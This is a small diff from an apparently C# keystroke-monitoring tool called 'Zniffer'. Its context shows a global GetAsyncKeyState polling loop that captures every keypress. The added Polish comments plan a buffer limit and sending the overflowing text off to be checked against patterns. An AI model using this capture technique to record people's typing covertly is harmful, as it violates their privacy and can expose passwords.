@@ -55,6 +55,8 @@ namespace Zniffer {
                 if (GetAsyncKeyState(i) == -32767) {
 
                     //enter czysci string
+                    //limit znakow w stringu
+                    //przekroczenie limitu = to co wypada wysłać do sprawdzenia? poroblem - nałożone części mogą dwa razy zwrócić wskazanie jeśli wzorzec był na przecięciu
 
                     bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                     bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
